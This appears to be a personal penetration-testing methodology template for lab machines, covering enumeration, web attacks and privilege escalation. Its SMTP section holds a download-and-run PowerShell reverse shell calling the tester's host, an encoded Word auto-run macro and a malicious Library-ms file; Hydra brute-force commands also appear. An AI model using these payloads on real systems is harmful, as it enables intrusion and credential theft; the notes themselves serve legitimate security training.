@@ -1,0 +1,451 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <bookmarks list=""/>
+  <node name="NAME [IP]" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="11" is_bold="1" foreground="" ts_creation="1569564485" ts_lastsave="1688917213">
+    <rich_text>Use this manual: </rich_text>
+    <rich_text link="webs https://book.hacktricks.xyz">https://book.hacktricks.xyz</rich_text>
+    <rich_text>
+Reverse shell cheatsheet: </rich_text>
+    <rich_text link="webs https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</rich_text>
+    <rich_text>
+Reverse shell generator: </rich_text>
+    <rich_text link="webs https://www.revshells.com/">https://www.revshells.com/</rich_text>
+    <node name="Initial Recon" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="14" is_bold="0" foreground="" ts_creation="1569560343" ts_lastsave="1688827378">
+      <rich_text>OS Check (NMap):
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <codebox char_offset="17" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap -O {IP}</codebox>
+      <node name="ENUM" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572497353" ts_lastsave="1688827326">
+        <rich_text>Start deep enum process with AutoRecon.py (https://github.com/Tib3rius/AutoRecon.git):
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+Enumerate again every port (NMap):
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+
+Enumerate every service (NMap):
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <codebox char_offset="87" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python3 autorecon.py -o {output directory} {IP} -vv</codebox>
+        <codebox char_offset="125" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap -p- {IP}</codebox>
+        <codebox char_offset="160" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">nmap -p {service port} {IP}</codebox>
+      </node>
+      <node name="VULN &amp; EXPLOIT CHECK" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572497437" ts_lastsave="1688828328">
+        <rich_text>For every service found, we have to check the version on:
+- ExploitDB
+- SearchSploit
+- Rapid7
+
+For every port with unidentified service we have to check “</rich_text>
+        <rich_text weight="heavy">port number + exploit</rich_text>
+        <rich_text>”  and check EVERY exploit for working.
+When an exploit is in Python2, we either:
+- repair it easily
+- get an existing updated version from issues or other branches in GitHub/GitLab etc.
+
+If an exploit gives us patched message or doesn't work, WE HAVE TO CHECK ANOTHER ONE, SAME SERVICE TO MAKE SURE THAT SERVICE IS UNEXPLOITABLE.</rich_text>
+      </node>
+    </node>
+    <node name="SERVICE ENUM " unique_id="76" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="39" is_bold="0" foreground="" ts_creation="1579569598" ts_lastsave="1688828388">
+      <rich_text>We have to enumerate every service and gather as much information as possible.</rich_text>
+      <node name="TCP" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1569559292" ts_lastsave="1688922291">
+        <rich_text>We will find the service report from AutoRecon.py, name Full TCP Scan.</rich_text>
+        <node name="FTP" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569560997" ts_lastsave="1688829046">
+          <rich_text>- find the version, maybe it's a vulnerable one
+- check if we are allowed anonymous login (user: anonymous)
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+- get the certificate, if any
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+We can try brute-force with Hydra (any username that we may find):
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+More possible exploits here: </rich_text>
+          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp</rich_text>
+          <codebox char_offset="108" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo nmap -sV -p21 -sC -A {IP}</codebox>
+          <codebox char_offset="140" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">openssl s_client -connect crossfit.htb:21 -starttls ftp</codebox>
+          <codebox char_offset="210" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l {username} -P {wordlist} {IP} ftp</codebox>
+        </node>
+        <node name="SSH" unique_id="48" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569559597" ts_lastsave="1688829327">
+          <rich_text>- check vulnerable version, some may allow </rich_text>
+          <rich_text style="italic">username enumeration</rich_text>
+          <rich_text> time-based
+- audit the entire service using SSH-audit (</rich_text>
+          <rich_text link="webs https://github.com/jtesta/ssh-audit">https://github.com/jtesta/ssh-audit</rich_text>
+          <rich_text>)
+
+We can try brute-force with Hydra (any username that we may find):
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+More possible exploits here: </rich_text>
+          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh">https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh</rich_text>
+          <codebox char_offset="224" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">hydra -l {username} -P {wordlist} {IP} ftp</codebox>
+        </node>
+        <node name="DNS" unique_id="104" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1688829378" ts_lastsave="1688829832">
+          <rich_text>- try zone transfer
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+- try reverse IP lookup
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+More exploits: </rich_text>
+          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns">https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns</rich_text>
+          <rich_text> </rich_text>
+          <codebox char_offset="20" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig axfr @&lt;DNS_IP&gt;
+dig axfr @&lt;DNS_IP&gt; &lt;DOMAIN&gt;</codebox>
+          <codebox char_offset="46" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dig -x {IP} @&lt;DNS_IP&gt;</codebox>
+        </node>
+        <node name="HTTP" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569558367" ts_lastsave="1688832531">
+          <rich_text>We have to </rich_text>
+          <rich_text weight="heavy">Dirbust</rich_text>
+          <rich_text> and </rich_text>
+          <rich_text weight="heavy">Feroxbust</rich_text>
+          <rich_text> using good wordlists:
+- /usr/share/seclists/Discovery/Web-Content/big.txt
+- /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+- /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt (if medium had no results)
+
+Also we have to check:
+- intersting exntensions (</rich_text>
+          <rich_text style="italic">docx</rich_text>
+          <rich_text>, </rich_text>
+          <rich_text style="italic">pdf</rich_text>
+          <rich_text>, </rich_text>
+          <rich_text style="italic">txt</rich_text>
+          <rich_text>, </rich_text>
+          <rich_text style="italic">php</rich_text>
+          <rich_text>, </rich_text>
+          <rich_text style="italic">sql</rich_text>
+          <rich_text>)
+- we have to check recursive
+- check if git is present on the server
+- check page contents, maybe credentials or something helpful is already there
+- check comments
+- check cookies and session</rich_text>
+          <node name="SQL injections" unique_id="60" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572496816" ts_lastsave="1688831912">
+            <rich_text>- check with quote “ ' ”
+- check the request in network tab for errors
+- check for time differences between </rich_text>
+            <rich_text weight="heavy">normal requests</rich_text>
+            <rich_text> and </rich_text>
+            <rich_text weight="heavy">ones that may have errors</rich_text>
+            <rich_text>
+
+More on SQL injections:
+- </rich_text>
+            <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/sql-injection">https://book.hacktricks.xyz/pentesting-web/sql-injection</rich_text>
+            <rich_text>
+- </rich_text>
+            <rich_text link="webs https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet">https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</rich_text>
+            <rich_text>
+</rich_text>
+          </node>
+          <node name="SSRF" unique_id="69" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1572496888" ts_lastsave="1689364066">
+            <rich_text>- if Windows, we can capture the Kerberos Ticket using Responder and SSRF
+- we can check for firwalls by checkinf if we get a request on more stranger ports (open a HTTP server on our machine on 4444 and try to get a request)
+
+More on that here: </rich_text>
+            <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery</rich_text>
+            <rich_text>
+
+It is also used to get inner services =&gt; we can request </rich_text>
+            <rich_text link="webs http://127.0.0.1:21">http://127.0.0.1:21</rich_text>
+            <rich_text> and if the connection is refused, then the box does not have FTP running internal (just an example). Check this: </rich_text>
+            <rich_text link="webs https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation">https://www.resecurity.com/blog/article/blind-ssrf-to-rce-vulnerability-exploitation</rich_text>
+          </node>
+          <node name="LFI &amp; RFI" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688830874" ts_lastsave="1688832516">
+            <rich_text>- we can try to include shells from our server
+[For LFI] we can poison the access logs requiresting </rich_text>
+            <rich_text link="webs http://url/malicious-payload">http://url/malicious-payload</rich_text>
+            <rich_text> then we can include the apache access log in order to execute the PHP payload that we included in it
+Places for </rich_text>
+            <rich_text weight="heavy">access.log</rich_text>
+            <rich_text> </rich_text>
+            <rich_text style="italic">/var/log/apache/access. log</rich_text>
+            <rich_text>.
+
+More on that here: </rich_text>
+            <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/file-inclusion">https://book.hacktricks.xyz/pentesting-web/file-inclusion</rich_text>
+          </node>
+          <node name="Upload Feature" unique_id="106" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688830881" ts_lastsave="1688832905">
+            <rich_text>- We can try to get the </rich_text>
+            <rich_text weight="heavy">Kerberos Ticket</rich_text>
+            <rich_text> with </rich_text>
+            <rich_text weight="heavy">Responder</rich_text>
+            <rich_text> by catching the </rich_text>
+            <rich_text weight="heavy">request used to upload</rich_text>
+            <rich_text>, and </rich_text>
+            <rich_text weight="heavy">changing the path of the file we want to upload to our responder server</rich_text>
+            <rich_text>
+- We can try uplading reverse shells
+
+Bypass methods for upload protection: 
+- </rich_text>
+            <rich_text link="webs https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass">https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass</rich_text>
+            <rich_text>
+- </rich_text>
+            <rich_text link="webs https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass">https://gitbook.seguranca-informatica.pt/cheat-sheet-1/web/file-upload-bypass</rich_text>
+            <rich_text>
+
+More on that here: </rich_text>
+            <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/file-upload">https://book.hacktricks.xyz/pentesting-web/file-upload</rich_text>
+          </node>
+        </node>
+        <node name="SMTP" unique_id="108" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1688922291" ts_lastsave="1688923638">
+          <rich_text>- Check the version, some exim versions might be VULNERABLE.
+- Check for </rich_text>
+          <rich_text weight="heavy">username enumeration</rich_text>
+          <rich_text>
+
+This might be a sign that we can trigger initial intrusion using a client-side attack
+We can create a </rich_text>
+          <rich_text weight="heavy">config.Library-ms</rich_text>
+          <rich_text>
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+Then we can run to start hosting a WebDav server:
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+And inside we must create a shortcut that will download PowerCat and start a reverse shell (note that we also have to start a server on port 8000 to host PowerCat):
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+For Word Macros. check this example:
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+For more check here: </rich_text>
+          <rich_text link="webs https://github.com/glowbase/macro_reverse_shell">https://github.com/glowbase/macro_reverse_shell</rich_text>
+          <codebox char_offset="215" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library"&gt;
+&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
+&lt;version&gt;6&lt;/version&gt;
+&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
+&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
+&lt;templateInfo&gt;
+&lt;folderType&gt;{7d49d726-3c21-4f05-99aa-fdc2c9474656}&lt;/folderType&gt;
+&lt;/templateInfo&gt;
+&lt;searchConnectorDescriptionList&gt;
+&lt;searchConnectorDescription&gt;
+&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
+&lt;isSupported&gt;false&lt;/isSupported&gt;
+&lt;simpleLocation&gt;
+&lt;url&gt;http://{Our IP}&lt;/url&gt;
+&lt;/simpleLocation&gt;
+&lt;/searchConnectorDescription&gt;
+&lt;/searchConnectorDescriptionList&gt;
+&lt;/libraryDescription&gt;</codebox>
+          <codebox char_offset="268" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/</codebox>
+          <codebox char_offset="435" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://{our IP}:8000/powercat.ps1');
+powercat -c {our IP} -p 4444 -e powershell"</codebox>
+          <codebox char_offset="475" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
+        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
+        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
+    ...
+        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
+        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
+        Str = Str + "A== "
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub</codebox>
+        </node>
+      </node>
+      <node name="UDP" unique_id="73" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="21" is_bold="0" foreground="" ts_creation="1569559301" ts_lastsave="1579569609">
+        <rich_text>[ NMAP OVERVIEW ]</rich_text>
+        <node name="SNMP" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1569560995" ts_lastsave="1688924091">
+          <rich_text>AutoRecon.py will enumerate the service.
+Check out:
+- onesixtyone
+- snmpwalk
+
+Enumerate the last command executed:
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+Also check RCE with SNMP (requires community string with write permissions): </rich_text>
+          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce</rich_text>
+          <rich_text>
+Also check this out: </rich_text>
+          <rich_text link="webs https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp</rich_text>
+          <codebox char_offset="115" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">snmpwalk -v 1 -c {community string} {IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull</codebox>
+        </node>
+      </node>
+      <node name="STUCK?" unique_id="77" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="19" is_bold="0" foreground="" ts_creation="1569563263" ts_lastsave="1688829299">
+        <rich_text weight="heavy">Things to consider</rich_text>
+        <rich_text>
+☐ Have you confirmed the service on the port manually and googled all the things (the SSH string, the banner text, the source)?
+☐ Is there a service that will allow you to enumerate something useful (i.e. usernames) but maybe doesn't make that obvious (e.g. RID brute-force through SMB with crackmapexec or lookupsid.py)?
+☐ Have you used the best wordlist possible for your tasks (is there a better/bigger directory list? Is there a SecLists cred list for this service?)
+☐ Have you fuzzed the directories you have found for a) more directories, or b) common filetypes -x php,pl,sh,etc
+☐ Have you tried some manual testing (MySQL, wireshark inspections)
+☐ Have you collected all the hashes</rich_text>
+        <rich_text weight="heavy"> and cracked them</rich_text>
+        <rich_text>?
+☐ Have you tried ALL COMBINATIONS of the username/passwords and not just the pairs given? Have you tried them across all services/apps?
+☐ Do the version numbers tell you anything about the host?
+☐ Have you tried bruteforce (cewl, patator)?
+☐ Can you think of a way to find more information: More credentials, more URLs, more files, more ports, more access?
+☐ Try usernames found with </rich_text>
+        <rich_text weight="heavy">capital letter</rich_text>
+        <rich_text>, all </rich_text>
+        <rich_text weight="heavy">letters capital</rich_text>
+        <rich_text>
+☐ Do you need to relax some of the terms used for searching? Instead of v2.8 maybe we check for anything under 3.
+☐ Do you need a break?
+</rich_text>
+      </node>
+    </node>
+    <node name="PRIVILEGE ESCALATION" unique_id="107" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1688917213" ts_lastsave="1688924283">
+      <rich_text>We have to pay attention to </rich_text>
+      <rich_text weight="heavy">files on the machine</rich_text>
+      <rich_text>, most of the time, this is how privilege escalation is done.</rich_text>
+      <node name="Linux" unique_id="109" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924277" ts_lastsave="1689363980">
+        <rich_text>Use:
+- linpeas
+- kernel exploit suggester
+
+Check kernel manually:
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+</rich_text>
+        <rich_text weight="heavy">!Important</rich_text>
+        <rich_text>: If we don't have GCC to compille on the box, and we encounter errors when we try to execute the locally compiled exploit, we need to simulate the exploited environment, check this: </rich_text>
+        <rich_text link="webs https://github.com/X0RW3LL/XenSpawn">https://github.com/X0RW3LL/XenSpawn</rich_text>
+        <rich_text>.
+
+Check files manually:
+</rich_text>
+        <rich_text justification="left"></rich_text>
+        <rich_text>
+- check </rich_text>
+        <rich_text style="italic">/opt</rich_text>
+        <rich_text> directory
+- check if </rich_text>
+        <rich_text style="italic">/etc/passwd</rich_text>
+        <rich_text> writable
+- check if </rich_text>
+        <rich_text style="italic">/etc/shadow</rich_text>
+        <rich_text> readable/writable</rich_text>
+        <codebox char_offset="66" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">uname -a</codebox>
+        <codebox char_offset="321" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">find / -perm -04000 2&gt;/dev/null</codebox>
+      </node>
+      <node name="Windows" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1688924320" ts_lastsave="1688924397"/>
+    </node>
+    <node name="POST-EX" unique_id="81" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="41" is_bold="0" foreground="" ts_creation="1569561597" ts_lastsave="1579569788">
+      <node name="ENUM" unique_id="82" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569563672" ts_lastsave="1569563850">
+        <node name="SYSTEM" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1569563850" ts_lastsave="1569563853"/>
+        <node name="FILES &amp;&amp; DIR" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1569563853" ts_lastsave="1569563897"/>
+        <node name="PERMISSIONS" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1569563863" ts_lastsave="1569563951"/>
+        <node name="PROCESSES" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1569563860" ts_lastsave="1569563936"/>
+        <node name="JOBS" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1569563864" ts_lastsave="1569563964"/>
+        <node name="USERS &amp;&amp; GROUPS" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1569563866" ts_lastsave="1569563980"/>
+        <node name="NETWORK" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1569563868" ts_lastsave="1569563988"/>
+        <node name="MISC" unique_id="90" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1569563990" ts_lastsave="1569563993"/>
+        <node name="SUMMARY OF VULNERABILITIES" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="12" is_bold="0" foreground="" ts_creation="1568174437" ts_lastsave="1569561446">
+          <rich_text>High level summary of the system's vulnerabilities -- basically a forced stop-and-check processing stage so as not to drop into rabbit holes.
+
+</rich_text>
+          <node name="ATTACK SURFACE" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="34" is_bold="0" foreground="" ts_creation="1568175777" ts_lastsave="1569564064">
+            <rich_text weight="heavy">What are</rich_text>
+            <rich_text> </rich_text>
+            <rich_text weight="heavy">the vulnerabilities?</rich_text>
+            <rich_text>
+
+
+
+</rich_text>
+            <rich_text weight="heavy">What seems most likely or most straightforward to leverage and why?</rich_text>
+            <rich_text>
+
+
+
+</rich_text>
+            <rich_text weight="heavy">Do we have all the correct files/versions/access to exploit?</rich_text>
+            <rich_text>
+</rich_text>
+          </node>
+        </node>
+      </node>
+      <node name="LOOT" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="36" is_bold="0" foreground="" ts_creation="1569564136" ts_lastsave="1569564146">
+        <node name="CREDS" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1569564152" ts_lastsave="1569564154"/>
+        <node name="HASHES" unique_id="99" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1569564154" ts_lastsave="1579569687"/>
+        <node name="PROOF" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="11" is_bold="0" foreground="" ts_creation="1579569687" ts_lastsave="1579569689"/>
+      </node>
+    </node>
+    <node name="SUMMARY OF ESCALATION" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="1569563677" ts_lastsave="1579569756">
+      <rich_text weight="heavy">Name</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text weight="heavy">Link</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text weight="heavy">TYPE</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text weight="heavy">EXPLANATION</rich_text>
+      <rich_text>:
+
+
+</rich_text>
+      <rich_text weight="heavy">HOW WAS THIS DISCOVERED </rich_text>
+      <rich_text>(should be in steps for enum, vuln)?
+
+ 
+</rich_text>
+      <rich_text weight="heavy">HOW WAS THIS EXPLOITED?</rich_text>
+      <rich_text>
+
+POC here.
+
+</rich_text>
+      <rich_text weight="heavy">SCREENSHOTS</rich_text>
+      <rich_text>:
+
+☐ ifconfig &amp;&amp; whoami &amp;&amp; proof.txt
+☐ Shell/similar
+
+
+
+======
+</rich_text>
+      <rich_text weight="heavy">
+STEPS:</rich_text>
+    </node>
+    <node name="LOG" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="20" is_bold="0" foreground="" ts_creation="1569564448" ts_lastsave="1579569913">
+      <rich_text>Useful for keeping track of work when you leave a box for awhile and come back to it.</rich_text>
+    </node>
+    <node name="MISC NOTES" unique_id="103" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="5" is_bold="0" foreground="" ts_creation="1579569468" ts_lastsave="1579569936">
+      <rich_text>Dump whatever in here.</rich_text>
+    </node>
+  </node>
+</cherrytree>
